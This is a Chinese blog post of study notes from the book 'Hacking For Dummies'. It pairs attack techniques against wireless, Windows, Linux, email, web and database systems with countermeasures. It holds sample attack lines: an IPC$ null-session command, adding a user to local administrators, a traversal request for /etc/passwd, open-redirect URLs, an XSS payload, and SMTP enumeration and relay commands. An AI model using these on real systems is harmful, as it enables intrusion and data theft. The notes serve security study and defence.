将接入点的发射功率调小 使用较小的或不同类型的天线以减弱信号。 脆弱的无线工作站 防御脆弱无线工作站的对策 除了其他网络主机外，要定期对无线工作站执行漏洞评估 应用最新的厂商安全补丁，并强制使用强用户密码 在所有可以使用个人防火墙和终端安全软件的无线系统上使用这些软件 安装反恶意软件软件 默认的配置设置 默认的SSID和管理员密码。 防止默认配置设置被利用的对策 确保自己更改了默认的管理员密码和SSID 最少要启用WPA 如果不需要SSID广播功能的话，将其禁用 为接入点和无线网卡应用最新的固件补丁 Windows攻击 鉴于Windows的易用性、为企业准备的活动目录(Active Directory)服务，以及功能丰富的.NET开发平台，很多组织出于联网和计算的需求已经使用了微软平台。很多企业，特别是那些中小型企业，在网络使用中是完全依赖Windows的。很多大型组织的关键服务器(比如Web服务器和数据库服务器)也是运行在Windows平台上的。 敏感信息的泄露 密码被破解，并被用于执行其他攻击 系统由于遭受拒绝服务攻击而彻底离线 被黑客取得安全的远程控制权 整个数据库被窜改或删除 选择工具 免费的微软工具 Windows内置的程序，用于NetBIOS和TCP/UDP服务枚举 用于收集NetBIOS名称表信息的nbstat 用于显示本地Windows系统的开放端口netstat 用于运行多项基于网络命令的net Microsoft Baseline Security Analyzer，可用来测试缺失的补丁和基本的Windows安全设置 Sysinternals，可用来在本地或通过网络探查，刺探和监控Windows服务、进程和资源。 多功能评估工具 端口扫描 操作系统指纹测试 简单的密码破解 对工具在Windows系统中找到的各类安全缺陷进行详细地漏洞映射 GFI LANguard QualysGuard 专用工具 Metasploit ShareEnum,可用于对共享的枚举 SuperScan，可用于TCP端口扫描、ping扫描和对共享的枚举 TCPView，可用于查看TCP和UDP会话的信息 Winfo，可用于空会话枚举，从而收集诸如安全政策、本地用户账户和共享之类的配置信息。 收集信息 扫描系统 1.测试 (1)运行基本扫描，找到各Windows系统中都有哪些端口是开放的 SuperScan (2)使用LANguard进行操作系统枚举，比如扫描共享和具体的操作系统版本 LANguard,Nmap (3)确定潜在的安全漏洞 2.防御系统扫描的对策 使用网络防火墙 在各系统上都使用Windows防火墙或其他个人防火墙软件。关闭用于RPC服务(135)和NetBIOS服务(137-139,445)的网络端口 禁用非必需的服务 NetBIOS(网络基本输入输出系统) 用于网络浏览的UDP端口： 137：NetBIOS名称服务 138：NetBIOS数据报服务 用于服务器消息块(SMB)的TCP端口 139：NetBIOS会话服务 445：在没有NetBIOS的情况下通过TCP/IP运行SMB 3.攻击 未认证枚举 共享 空会话 将匿名连接(或空会话)映射道名为IPC$(表示进程间通信)的隐藏共享 可收集Windows主机的配置信息 编辑远程计算机注册表的部分内容 映射 1.net use \\host_name_or_IP_address\ipc$ &quot; &quot;&quot;/user&quot; 收集信息 1.net view:显示共享信息 2.配置和用户信息 Winfo和DumpSec可以收集与用户和配置有关的实用信息 reg：系统所属的Windows域；安全政策设定；本地用户名；驱动器共享 Winfo：http://www.ntsecurity.nu/toolbox/winfo/ 3.NetUsers工具 www.systemtools.com/free.htm 可以显示谁登录到了远程的Windows计算机 reg：被滥用的账户权限；当前登录到系统的用户 防御空对话攻击的对策 阻止以下TCP端口穿越网络防火墙或个人防火墙 139；445 可以禁用网络连接属性里的“Microsoft网络的文件和打印机共享” 限制接入到系统的匿名连接 HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\RestrictAnonymous键的DWORD值设置成以下状态 空：默认设置 不允许对SAM账户和共享进行枚举（值1）（中等安全） 没有显式匿名权限就不允许访问（值2）（高安全） 共享权限 介绍的Windows版本太低了，不写 利用缺少的补丁进行攻击 Win7具备以下一些安全功能： 默认启用的Windows Defender间谍软件防护 Windows防火墙的增强版对入站和出站流量都进行了保护 通过用户账户控制(UAC)，取消常规用户的本地管理员权限 将运行服务的特权限至最小 网络访问保护(NAP) 通过BitLocker实现驱动器加密 对Internet Explorer 8机械能大量隐私强化和安全更新 使用Metasploit www.metasploit.com/framework 步骤： Exploits Forward Apply net localgroup administrators username /add 防御缺失补丁漏洞攻击的对策 Windows Update Windows Server Update Services(WSUS) BigFix Patch Management Lumension Patch and Remediation Linux 丰富的资源可供选择，包括书籍、网站以及开发人员和顾问的专业知识 Linux不像Windows及其应用程序那样易受攻击。 易用性的提升 Linux的漏洞 敏感信息被泄露 密码被破解 数据库被损坏或删除 系统彻底离线 选择工具 SuperScan 3:可以用于ping扫描和TCP端口扫描 Nmap:可用于操作系统指纹测试和端口 LANguard：可用于端口扫描、枚举和漏洞测试 THC-Amap：可用于应用程序版本映射 Tiger：可用于自动评估本地系统安全设置 Linux Security Auditing Tool(LSAT):可用于自动评估本地系统安全设置 QualysGuard：可用于操作系统指纹测试、端口扫描和漏洞测试 Nessus：可用于操作系统指纹测试、端口扫描和漏洞测试 BackTrack工具集 工具下载地址：SourceForge.net freshmeat.net 收集信息 扫描系统 守护进程(daemon) Internet服务，比如Apache Web服务器(httpd)、telnet(telnetd)和FTP(ftpd),包括软件版本、内部IP和用户名 TCP和UDP小服务，reg:echo、daytime和chargen 有漏洞的OpenSSH版本 finger服务信息 BSD的r系列服务rlogin和rexec 防御系统扫描对策 防火墙 netfilter/iptables（www.netfilter.org） 基于主机的入侵防御应用,reg:PortSentry SNARE 禁用不需要的服务，RPC、HTTP、FTP和telnet 搜索 1.漏洞 FTP telnetd r系列服务 旧版本的sendmail 2.工具 Nmap Amap netstat -anp可显示在本地机器上运行的服务 lsof（List Open Files）会显示系统中监听的进程和打开的文件 防御措施 1.禁用不需要的服务 inetd.conf # ps -aux # vi /etc/inetd.conf 按I 进程开头输入#，注释掉 Esc :wq kill -HUP PID chkconfig Chkconfig--del snmpd 2.访问控制 TCP Wrappers可以控制对运行关键服务（如FTP或HTTP）的访问 rhosts和hosts.equiv文件 1.hosts.equiv /etc/hosts.equiv文件不会泄露root访问信息，不过它指明了系统中的哪些账户可以访问本地主机上的服务 如果配上.rhosts文件，外部黑客就可以读取hosts.equiv文件，然后伪造IP和主机名，获取访问权 2.rhosts $home/.rhosts文件指明了哪些远程用户不需要密码就可以在本地系统中访问BSD的r系命令。.rhosts文件可能是以下这样的： tribe scott tribe eddie 该文件可以让远程系统tribe上的用户Scott和Eddie可以登录到本地主机，授予权限。如果远程主机和用户字段出现的是加号(+)，就表示任何主机上的任何用户都可以登录到本地系统。黑客可以通过以下手段向其添加数据项： 手工处理该文件 利用系统运行的Web服务器应用中不安全的CGI(Common Gateway Interface,通用网关接口)脚本存在的漏洞，运行脚本进行漏洞攻击。 这些文件默认是未启用的。 防御.rhosts和hosts.equiv文件攻击的对策： 1.禁用命令 注释掉inetd.conf文件中以shell、login和exec开头的行 编辑位于/etc/xinetd.d目录中的rexec、rlogin和rsh文件。将&quot;disable=no&quot;改为&quot;disable=yes&quot; 在Red Hat企业版Linux中可以setup-&gt;&quot;System Services&quot;-&gt;删除每个r服务旁边的星号 2.阻止访问 在防火墙阻止伪造的地址 只为每个文件的所有者设定读权限 .rhosts:在每个用户的home目录下输入： chmod 600 .rhosts hosts.equiv:在/etc目录下输入： chmod 600 hosts.equiv 使用Tripwire监控这些文件 网络文件系统(Network File System,NFS) 用途是从本地机器上挂接(mount)远程文件系统(类似于Windows中的共享) 网络文件系统攻击 如果/etc/exports文件的设置允许所有人读取整个文件系统，远程hacker就可以获取信息。 /etc/exports文件中加入一行 / rw 表示任何人都能远程挂接root分区，并具有读写权限。还要满足下列条件： 必须加载nfsd，必须加载将NFS映射到RPC的portmap守护线程 防火墙必须允许网络文件系统流量通过 被允许进入运行着nfsd的服务器的远程系统必须载入/etc/hosts.allow文件 防御网络文件系统攻击的对策 如果不需要网络文件系统，那么将其禁用 如果需要，请： 在防火墙过滤网络文件系统流量，过滤111端口上的流量。 确保/etc/exports文件和/etc/hosts.allow文件得到妥善配置 文件权限 SetUID(用于用户ID) SetGID(用于组ID) 文件权限攻击 默认情况下，以root权限运行的流浪程序是很容易被隐藏起来的。外部攻击者或恶意内部人员可能会这样做，从而在系统中隐藏黑客文件(如rootkit)。完成这一切只需要在他们的黑客程序中编入SetUID和SetGID代码即可。 防御文件权限攻击的对策 1.手工测试 为SetUID配置过的程序： find / -perm -4000 -print 为SetGID配置过的程序： find / -perm -2000 -print 可被任何人读取的文件： find / -perm -2 -type f -print 隐藏文件： find / -name &quot;.*&quot; 2.自动测试 变更检测应用，如Tripwire，有助于记录什么内容在何时发生了改变 文件监控程序，如COPS，可以找出哪些状态已经改变的文件 缓冲区溢出 RPC和其他脆弱的守护进程都是缓冲区溢出攻击的常见目标。可以进行修改系统文件和读取数据库文件等活动。 攻击 攻击者既可以手动向Linux机器发送信息字符串，也可以编写脚本来完成。字符串内容： 告诉处理器基本上什么都别做的指令。 取代受攻击进程的恶意代码，比如用exec (&apos;&apos; /bin/sh&apos;&apos;)创建shell命令提示符 指向内存缓冲区中恶意代码起始位置的指针。 运行在Linux中易受攻击的软件具体包括Samba、MYSQL和Firefox。 防御缓冲区溢出攻击的对策 禁用不需要的服务； 用防火墙或基于主机的入侵防御保护自己的Linux系统； 启用另一种用密码验证用户身份的访问控制机制，比如TCP Wrappers。 物理安全 物理安全攻击 当黑客就在系统控制台时，任何事都可能发生，包括按下Ctrl+Alt+Delete组合键重启系统。在系统重启之后，黑客就可以启动系统的单用户模式，root密码置零 物理安全防御对策 对/etc/inittab文件进行编辑，将# ca:ctrlaltdel:/sbin/shudown -t3 -r now这一行注释，这将防止他人通过按下组合键重启系统。 一般性安全测试 shadow password文件中配置错误或未经授权的项 密码复杂度的要求 相当于root的用户 配置在脚本调度程序cron中的可疑自动化任务 系统二进制文件的签名检查 rootkit检查 网络配置，包括防止数据包欺骗和其他拒绝服务(DoS)攻击的对策 系统日志文件的权限 工具：Tiger安全审计工具(www.nongnu.org/tiger) LSAT和Bastille Hardening程序 Novell Netware (跳过，，目前应该接触不到) 攻击应用程序 通信和消息系统 Email 即时消息(IM)和IP电话(VoIP) 针对消息系统的恶意攻击包括： 传输恶意软件； 使服务器崩溃； 获得对工作站的远程控制； 捕获在网络中传送的敏感信息； 审读存储在服务器和工作站上的Email； 审读工作站硬盘驱动器中的即时消息日志文件； 通过日志文件或网络分析器，收集传送趋势信息，这些信息可以将人和组织之间的对话透露给黑客； 捕获并回放电话交谈； 收集内部网络配置信息，如主机名和IP地址。 Thomas Akin 电子邮件攻击 攻击方法：收集公开信息，扫描并枚举系统，发现和利用漏洞 电子邮件炸弹 电子邮件炸弹可以让服务器崩溃，并为攻击者提供未经授权的管理员访问权。它通过对Email系统，甚至是网络和互联网连接造成拒绝服务来进行攻击，因为它占据大量带宽，有时还会需要大量存储空间。 1.附件 附件超载攻击 为使服务完全中断，整个电子邮件服务器可能成为目标。 存储器超载 带宽阻塞 防御措施： 限制Email的大小 限制每个用户在服务器上的存储空间。 2.连接 发送海量Email，可能导致服务器无法处理任何入站或出站的TCP请求，可能会造成服务器完全被锁定或服务器崩溃，从而使攻击者能够获得对系统的管理员访问权或root访问权。 海量Email攻击 3.自动化的Email安全控制 tarpitting.会检测目的地为未知用户的入站消息。 电子邮件防火墙。reg：CipherTrust IronMail和Messaging Architect的M+Guardian。 周边保护。 CAPTCHA。 banner 获取banner，看看能否发现在运行的是哪种Email服务器软件。是搞清SMTP、POP3和IMAP服务器有哪些了解的一项特别关键的测试。 1.收集信息 25端口 telnet(ip or-hostname-of-your-server)25 --收集SMIP信息 110端口 --收集POP3 143 --收集IMAP smtpscan(www.freshports.org/security/smtpscan) 可被利用的堆溢出漏洞： Microsoft Exchange(http://cve.mitre.org/cgi-bin/cvename.cgi?name=2006-0027) Novell NetMail(http://cve.mitre.org/cgi-bin/cvename.cgi?name=2006-6424) 2.防御banner攻击的对策 修改默认的banner，将信息隐藏起来 软件补丁 尽可能巩固自己的服务器 SMTP(简单邮件传输协议)攻击 1.账户枚举 25 VRFY 是“verify”(验证)的缩写 --可以让服务器检查某个特定的用户ID是否存在。垃圾邮件制造者们通常会自动化该方法，以执行目录收集攻击(DHA)。这种方法可以从服务器或域中收集有效的电子邮件地址。 使用账户枚举进行的攻击 vrfy info@principlelogic.com EXPN 是“expend”(扩展)的缩写 --可使攻击者能验证服务器上存在哪些邮件列表。 expn coolusers 结果：&lt;CoolUsers@principlelogic.com&gt; 另一种方法，使用Tamosoft Essential NetTools中的EmailVerify程序。 还有一种捕获方法：使用BT工具集的TheHarvester通过Google和其他搜索引擎收集地址。 BT-&gt;Information Gathering-&gt;SMTP-&gt;Goog Mail Enum，然后输入./goog-mail.py -d&lt;域名&gt; -l 500 -b google 2.中继 SMTP中继让用户可以通过外部服务器发送电子邮件。 自动测试 www.abuse.net/relay.html 基于Windows的工具：NetScanTools Pro-&gt;SMTP Relay 手工测试 (1)telnet连接服务器的25端口 使用自己最喜欢的图形telnet应用，reg:HyperTerminal或SecureCRT telnet mailserver-address 25 (2)输入命令告诉服务器，“嗨，我正从这个域进行连接呢” (3)输入命令告诉服务器自己的Email地址：reg： mail from:yourname@yourdomain.com (4)输入命令告诉服务器要将Email发送给谁，reg: rept to:yourname@yourdomain.com (5)输入命令告诉服务器接下来是消息正文,reg: data (6)输入以下文本作为消息正文 A relay test ! (7)在一行的最后使用句点结束该命令 (8)检查服务器上的中继功能 查找从服务器返回的Relay not allowed(不允许使用中继)这样的消息。如果有，说明要么不允许，要么过滤了SMTP中继转发。 rcpt to: --获得该信息 如果收到自己发送的Email，那么说明SMTP中继转发功能已启用。 防御SMTP中继攻击的对策 在Email服务器上禁用SMTP中继 3.电子邮件头信息泄露 攻击者可以找到： 电子邮件客户端机器的内部IP地址 客户单和电子邮件服务器的软件版本以及这些软件的漏洞 主机名 4.捕获流量 dsniff工具包中的Mailsnarf NetResident 5.恶意软件 EICAR测试字符串，通过Email消息正文或文件附件的形式传输，从而让自己能看到服务器和工作站的反应。在计算机中访问含有以下字符串的文本文件，看看自己的杀毒软件或其他恶意软件防御软件能否检测出该“病毒” X50!P%@AP[4\PZX54(P^)7CC}$EICAR STANDARD-ANTIVIRUS-TEST-FILE!$H+H* GFI的电子邮件安全测试区 即时消息 漏洞： 姓名劫持 利用即时消息客户端的漏洞，让攻击者获取对计算机的远程控制权 传输恶意软件 一般在文件共享和日志文件方面有漏洞。会影响（AIM）和ICQ 1.文件共享 确认网络中即时消息使用情况最佳方式就是使用网络分析器并监控即时消息流量。 2.日志文件 c:\Program Files\ICQ找到ICQ对话日志文件 防御即时消息的对策 1.检测即时消息流量 工具： 网络分析器 Quest Policy Authority for UC FaceTime的IMAuditor 桌面审计：Ecora的Auditor Professional和Microsoft System Center ConfigurationManager 2.维护和配置 用户行为 禁止或限制所有P2P软件 指导用户 系统配置 更改默认按照目录 补丁 杀毒软件和防火墙 如果出于业务目的而允许在网络中使用即时消息，请考虑标配一种基于企业的即时消息应用。如：Jabber或Lotus Sametime IP电话 默认设置 补丁缺失 弱密码 IP电话具有两个特有的安全命门：第一个是电话服务中断；语音通话没有经过加密 SIP RTP 1.扫描漏洞 SiVuS(http://vopsec.net/html/tools.html) 2.捕获并记录语音流量 Cain 防御IP电话漏洞的对策 (书上没有怎么介绍) 网站和Web应用 工具: Acunetix Web Vuinerability Scanner(www.acunetix.com)，包含了端口扫描器、HTTP嗅探器和自动SQL注入工具 Firefox Web Developer(http://chrispederick.com/work/web-develeper),用于对网页进行手工分析和操作 HTTrack Website Copier(www.httrack.com),可为网站制作镜像用于离线检查 N-Stalker Web Application Security Scanner(www.nstalker.com/eng/products/nstealth)可进行一体化安全测试，含有密码破解和Web服务器负载测试工具。 WebInspect(www.spidynamics.com/products/webinspect/index.html)用于一体化安全测试，包含了HTTP代理和HTTP编辑器，以及自动SQL注入工具。 漏洞扫描器(QualysGuard和LANguard) 漏洞攻击工具(Metasploit) hacker:Caleb Sima Web漏洞 目录遍历 1.爬虫程序 2.Google 高级查询： site:主机名 关键词。这将搜索列出的任意关键词。reg：SSN，confidential和credit card filetype:文件扩展名主机名。reg:.doc、.pdf、.db等 allintitle会搜索网页标题中的关键词； inurl会搜索网页URL中的关键词； related会找出与该网页相似的网页； link会显示链接到该网页的其他网站。 在www.google.com/intl/en/help/operators.html找到具体的定义和更多操作符 Google Hacking Database(GHDB)(http://johnny.ihackstuff.com/ghdb) http://artkast.yak.net/81找到其他查询 Google Groups(http://groups.google.com) hacker:Johnny Long 防御目录遍历的对策 不要在Web服务器上存储旧的、敏感或非公开的文件。/htdocs或DocumentRoot 配置robots.txt文件，防爬虫 确保Web服务器配置得当，从而使公众只能访问那些网站正常运转所需的文件。最小特权是关键。 访问控制措施有： Apache的httpd.conf文件和.htaccess文件 Internet信息服务管理器的主目录和目录设置（IIS 5.1） Internet信息系服务管理器的主目录和虚拟目录设置(IIS 6.0) 最后考虑使用搜索引擎蜜罐系统，reg:Google Hack Honeypot(http://ghh.sourceforge.net) 输入过滤攻击 一些插入恶意构造数据(通常是一次性插入过多数据)的攻击可能针对网络和Web应用展开，这可能会导致系统混乱或崩溃，或是使系统向攻击者泄露过多的信息。 1.缓冲区溢出 reg: &lt;form name=&quot;Webauthenticate&quot; action=&quot;www.your_Web_app.com/login.cgi&quot; method=&quot;POST&quot;&gt; ... &lt;input type=&quot;text&quot; name=&quot;inputname&quot; maxsize=&quot;12&quot;&gt; ... &lt;/form&gt; 操纵它 需要使用Web代理逐步跟踪网页提交过程,Web代理有：Web漏洞扫描器和Paros Proxy软件 Web代理处于Web浏览器与待测试服务器之间，使大家可以操控发送给服务器的数据。 Firefox:工具-&gt;选项-&gt;高级-&gt;网络-&gt;连接-&gt;设置-&gt;手动配置代理 IE:工具-&gt;Internet选项-&gt;连接-&gt;局域网设置-&gt;为LAN使用代理服务器 在浏览器提交页面之前，修改变量的字段长度，用大家提供的任意长度提交。也可以用Firefox中的&quot;Web开发者&quot;选项删除Web表单中定义的最大表单长度。 2.URL的篡改 自动输入攻击会篡改URL，并将其发送回服务器，告诉该Web应用做各种事情。本地文件包含(local file inclusion)就是这样一种漏洞。这是在Web应用接受基于URL的输入(通常是通过CGI)，并将指定文件的内容返回给用户时发生的。reg：WebInspect会发送这样请求： https://www.your_web_app.com/onlineserv/Checkout.cgi?state=datail&amp;language=english&amp;imageSet=/../..//../..//../..//../..///etc/passwd other method: http://www.your_Web_app.com/error.aspx?PURL=http://www.bad-site.com&amp;ERROR=Path+&apos;OPTIONS&apos;+is+forbidden. http://www.your_Web_app.com/exit.asp?URL=http://www.bad-site.com 可通过电子邮件向不知情的用户发送该链接，或将其发布到网络上。 3.隐藏字段的篡改 (1)查看HTML源代码 (2)篡改存储在这些字段中的信息 (3)重新将页面放回服务器 Web Proxy或Paros Proxy可以篡改隐藏字段。 4.代码注入和SQL注入 代码注入攻击也会篡改特定的系统变量： http://www.your_Web_app.com/script.php?info_variable=X 如果可以，就修改X的值继续注入 常见的SQL注入有：标准注入(基于错误的注入)和盲注入 一种快速确定Web应用是否易受SQL注入的方法：只要在Web表单字段或是URL的末尾输入一个单引号(&apos;)，如果返回SQL错误，那么十之八九会出现SQL注入。 WebInspect自带的SQL Injector 5.跨站脚本(cross-site scripting,XSS) 在网页通过JS和VBScript显示出未被正确验证的用户输入时就会出现这种情况。黑客可以利用输入过滤机制的缺失，让网页在任何浏览该网页的用户计算机上执行恶意代码。 reg：跨站脚本攻击可以显示另一个流氓网站的用户ID和密码登录页面。如果输入，就会进入到其日志文件中。其他的恶意代码便会发送到受害人的计算机，并能以与系统中查看它的Web浏览器或电子邮件应用程序相同的安全权限运行。恶意代码会为黑客提供对浏览器cookie、浏览器历史文件的完整读写访问权，甚至可能允许下载/安装恶意软件。 &lt;script&gt;alert(&apos;XSS&apos;)&lt;/script&gt; WebInspect和Acunetix Web Vulnerability Scanner就很善于找出跨站脚本。 防御输入攻击的对策 应用应该避免呈现Web浏览器和用户不需要看到的静态值。这些数据应该在服务器端的Web应用中实现，而且只有在需要时才从数据库中检索。 应用应该从输入字段中过滤掉&lt;script&gt;标签 可以的话，应该禁用Web服务器和数据库服务器的错误信息。 十六进制编辑器查看应用是如何在内存中存储敏感信息的。可以使用WinHex(www.x-ways.net/winhex) reg:(一个脆弱的GET请求) https://www.your_Web_app.com/access.php?username=kbeaver&amp;password=WhAteVur!&amp;login=SoOn GET请求通常会存储在用户Web浏览器的历史文件、Web服务器的日志文件和代理的日志文件中。 默认脚本攻击： 比如CGI(通用网关接口)和ASP(动态服务器页面)脚本 测试用Find程序 N-Stalker Web Application Security Scanner 防御默认脚本攻击措施： 在向Web应用中部署脚本之前先了解脚本的作用机制 在使用脚本之前，确定从Web服务器中删除了所有的默认脚本或示例脚本。 为网站/Web应用中的敏感区域设置文件权限以防止公众访问这些区域。 不安全的登录机制： 使用无效的用户ID和有效的密码 使用有效的用户ID和无效的密码 使用无效的用户ID和无效的密码 URL会返回不同值 Brutus BlackKnightList 防御不安全登录机制的对策 返回给最终用户的登录错误消息要尽可能一般化 避免应用程序在URL中返回对无效用户ID和无效密码区别对待的错误代码。 reg:www.your_Web_app.com/login.cgi?success=false; 使用CAPTCHA或Web登录表单，以阻止/减慢密码破解的尝试 在Web服务器上或Web应用中部署入侵者锁定机制，从而在10至15次登录失败后锁定用户账户。 将厂商提供的默认密码更改为易于记忆而难于破解的新密码。 Web2.0的黑客攻击 新技术：Web Services，Ajax和Flash 测试Web2.0应用中的漏洞： Firefox Web Developer可用于分析脚本代码和执行其他手工检查 SWFScan可用于分析Shockwave Falsh(.swf)文件 WSDigger可用于分析Web服务 WSFuzzer可用于分析Web服务 降低风险的做法： 可用OWASP WebGoat Project和Foundstone的Hacme Tools测试 为保护Web应用和关联的数据库，请使用不同的机器运行Web服务器、应用服务器和数据库服务器。 使用内置的Web服务器安全功能，reg：IIS中的应用隔离功能 使用工具隐藏Web服务器的身份，reg：Port 80 Software的ServerMask 如果在hacker在运行Microsoft IIS服务器和应用，那么可以重命名所有的ASP脚本，为其增加.cgi扩展名 如果是Linux Web服务器，可用IP Personality改变操作系统的指纹信息 改在非标准端口上运行Web应用。 防火墙 可以检测并阻止Web应用攻击的、基于网络的防火墙.reg:Juniper Networks,SonicWall和Check Point 基于主机的Web应用入侵防御系统。reg:SecureIIS,ServerDefender 源代码分析： 静态源代码分析工具：Ounce Labs和Klockwork。 Checkmarx的CxDeveloper，Security Innovation 数据库和存储系统 工具： Advanced SQL Password Recovery(www.elcomsoft.com/asqlpr.html)可破解Microsoft SQL Server的密码 Cain&amp;Abel(www.oxid.it/cain.html)可用于破解数据库密码散列 QualysGuard可执行深入的漏洞扫描 SQLPing3(www.sqlsecurity.com/Tools/FreeTools/tabid/65/Default.aspx)可用于确定网络中Microsoft SQL Server服务器的位置，检查空SA密码，并执行字典密码破解攻击 hacker:奇普·安德鲁斯 Absinthe Oracle工具:www.petefin nigan.co/tools.htm，Pete Finnigan Elcomsoft Distributed Password Recovery也可以破解Oracle密码散列 如果能访问SQL Server的master.mdf文件，就可以使用Elcomsoft的Advanced SQL Password Recovery立即回复数据库的密码。 Access工具：Advanced Access Password Recovery(www.elcomsoft.com/acpr.html) 利用Microsoft SQL Server Management Studio Express(www.microsoft.com/express/sql/default.aspx) 扫描数据库漏洞 缓冲区溢出； 特权提升； 可通过默认/未受保护账户访问的密码散列； 启用脆弱的身份验证方法； 在不验证身份情况下就可重命名的数据库监听器日志文件。 对SQL Server和Oracle深入检查的工具： NGSSQuirreL(www.ngssoftware.com/products/database-security) AppDetectivePro(www.appsecinc.com/products/appdetective) 减少数据库安全风险的做法； 在不同的机器上运行各数据库。 检查底层操作系统的安全漏洞。 确保数据库也处在打补丁和系统巩固工作的范围之内。 每个数据库系统都要求使用强密码。 使用恰当的文件和共享权限以防止他人窥探。 在敏感的生产数据用于开发或质量保证过程之前，要对这些数据采取反识别措施 检查Web应用是否具有SQL注入及相关的数据验证漏洞。 使用网络防火墙 运行最新版的数据库服务器软件。 存储系统 测试SAN和NAS系统安全性 工具： FileLocator Pro(www.mythicsoft.com/filelocatorpro)可用于查找非结构化文件中的敏感信息。 Identity Finder(www.Identity Finder)可用于查找非结构化文件中的敏感信息。 LANguard可用于查找开放且未受保护的共享 QualysGuard SuperScan 利基安全测试工具： CHAP Password Tester(www.isecpartners.com/cpt_chap_password_tester.html) CIFShareBF(www.isecpartners.com/SecuringStorage/CIFShareBF.zip) GrabiQNs(www.isecpartners.com/SecuringStorage/GrabiQNs.zip) NASanon(www.isecpartners.com/SecuringStorage/NASanon.zip) StorScan(www.isecpartners.com/storscan.html) 挖出网络文件中的敏感洗文本 文本搜索实用程序：FileLocator Pro或Effective File Search(www.sowsoft.com/search.htm) 员工的健康记录； 客户的信用卡号码； 公司的财务报表 使用FileLocator Pro时，查找： DOB：表示出生日期 SSN：表示社会保障号码 License：表示驱动程序的许可证信息 Credit：表示信用卡号码 搜索范围： .txt .doc和.docx .dbf .db .rtf .xls和.xlsx 使用Indentity Finder扫描存储设备 降低存储系统安全风险的最佳做法： 检查底层操作系统的安全漏洞 确保网络存储也处在打补丁和系统巩固工作的范围之内 要求为每个存储管理界面都使用强密码 使用恰当的文件和共享权限以防止他人窥探。 教育用户 在敏感的生产数据用于开发或质量保证过程之前，要对这些数据采取反识别措施 为合适的内网段使用网络防火墙 道德攻击的结果 汇报结果 整理结果： 评估工具上的漏洞分级 自己的安全专业知识 漏洞的具体背景 最终报告文档： 非技术问题 社会工程学漏洞 物理安全漏洞 IT运营弱点 其他 工作站和服务器 操作系统 其他 应用程序 公共访问性 内部情况 数据库系统 网络基础设施系统 集线器和交换机 路由器 防火墙 入侵检测系统 无线接入点 其他 内部漏洞，reg:内部主机和运营问题 外部漏洞：reg:公共主机、业务伙伴网络连接和远程工作者 漏洞优先级： 被利用的可能性 被利用的影响 x轴：可能性 y轴：影响度 OCTAVE 汇报方法： 执行测试的日期和时间 执行的测试 所发现漏洞的摘要 需要解决的漏洞的优先级列表 如何堵上所发现漏洞的建议和具体操作步骤 改善整体安全性一般性建议清单 行动项： 在所有的服务器上启用Windows审计 为服务器机房的门上一把安全的锁 根据全国漏洞数据库和互联网安全中心的基准测试/评分工具 巩固自己的无线接入点 使用交叉碎切碎纸机来销毁含有机密信息的纸质文件 在所有的笔记本电脑上安装防火墙 在所有的Web应用中都要验证输入 为数据库服务器应用最新的厂商补丁。 修补安全漏洞 将报告变为行动 打好补丁 补丁管理 补丁自动化 1.商业工具： BigFix Shavlik Technologies NetChk Ecora Patch Manager ScriptLogic Patch Authority Ultimate 微软的Windows服务器更新服务 GFI LANguard 2.免费工具 Microsoft Update Microsoft Baseline Security Analyzer(MBSA) 巩固系统 评估安全体系结构 管理安全变化 自动化道德黑客攻击流程 监控恶意使用 外包道德黑客测试 灌输注意安全的意识 三个十项 培养盟友和担保人 不要大惊小怪 证明组织承担不了被黑客攻破的后果 概述道德黑客测试的一般益处 展示道德黑尔康测试具体对组织有何帮助 融入企业之中 构建自己的信誉 从管理人员的角度讲话 展示所作努力的价值 灵活行事，多加适应 黑客攻击是唯一有效的测试方法的十项原因 坏人们有着坏想法，使用着好工具，并在发明新的攻击方法 IT治理和遵守规定不只是高层级的清单式审计 道德黑客测试是对审计及安全评估的补充 有人会问系统有多安全 平均定律是与企业相悖的 道德黑客测试让企业更好地理解风险 如果破坏发生，要有退路 道德黑客测试揭露了系统中最糟的问题 道德黑客测试结合了最好的渗透测试和漏洞测试 道德黑客测试能发现被忽视多年的运营弱点 工具和资源 蓝牙 BlueScanner--https://labs.arubanetworks.com Bluesnarfer--www.alighieri.org/tools/bluesnarfer.tar.gz 蓝牙阻击枪--www.tomsguide.com/us/how-to-bluesniper-pt1,review-408.html Blooover--http://trifinite.org/trifinite_stuff_blooover.html Bluejacking社区网站--www.bluejackq.com WindowsXP版BTScanner--www.pentest.co.uk/src/btscanner_1_0_0.zip Car Whisperer--http://trifinite.org/trifinite_stuff_carwhisperer.html 各种蓝牙攻击的详细展示--http://trifinite.org/Downloads/21c3_Bluetooth_Hacking.pdf NIST第800-48号特别出版物--http://csrc.nist.gov/publications/nistpubs/800-48-rev1/SP800-48r1.pdf Smurf--www.gatefold.co.uk/smurf 认证 认证道德黑客(Certified Ethical Hacker)--www.eccouncil.org/CEH.htm 注册信息安全管理师(Certified Information Security Manager)--www.isaca.org 注册信息系统安全专家(Certified Information Systems Security Professional)--www.isc2.org/cissp/default.aspx 注册无线安全专家(Certified Wireless Security Professional)--www.cwnp.com/cwsp/index.html CompTIA Security+ --www.comptia.org/certifications/listed/security.aspx SANS GIAC--www.giac.org 数据库 Advanced Access Password Recovery--www.elcomsoft.com/acpr.html Advanced SQL Password Recovery--www.elcomsoft.com/asqlpr.html AppDetectivePro--www.appsecinc.com/products/appdetective Elcomsoft Distributed Password Recovery--www.elcomsoft.com/edpr.html Microsoft SQL Server Management Studio Express--www.microsoft.com/express/sql/default.aspx NGSSQuirreL--www.ngssoftware.com/products/database-security Pete Finnigan的Oracle扫描工具清单--www.petefinnigan.com/tools.htm QualysGuard--www.qualys.com SQLPing3--www.sqlsecurity.com/Tools/FreeTools/tabid/65/Default.aspx 漏洞攻击工具 Metasploit Milw0rm 通用搜索工具 AfriNIC--www.afrinic.net APNIC--www.apnic.net ARIN--https://ws.arin.net/whois/index.html Bing--www.bing.com DNSstuff--www.DNSstuff.com dnstools.com--www.ndstools.com 文件扩展名资源--http://filext.com Google 政府域名--www.dotgov.gov Hoover`s企业信息--www.hoovers.com LACNIC--www.lacnic.net 军事域名--www.nic.mil Netcraft的What`s that site running?--www.netcraft.com RIPE网络协调中心--www.db.ripe.net/whois Switchboard.com--www.switchboard.com ....... (314-325，location:phone) 《黑客达人迷》摘录 标签： 字典黑客 2014-03-24 14:00 655人阅读 评论(0) 收藏 举报 分类： 逆向与破解（1） 版权声明：本文为博主原创文章，未经博主允许不得转载。 (一)字典文件： 1.ftp://ftp.cerias.purdue.edu/pub/dict 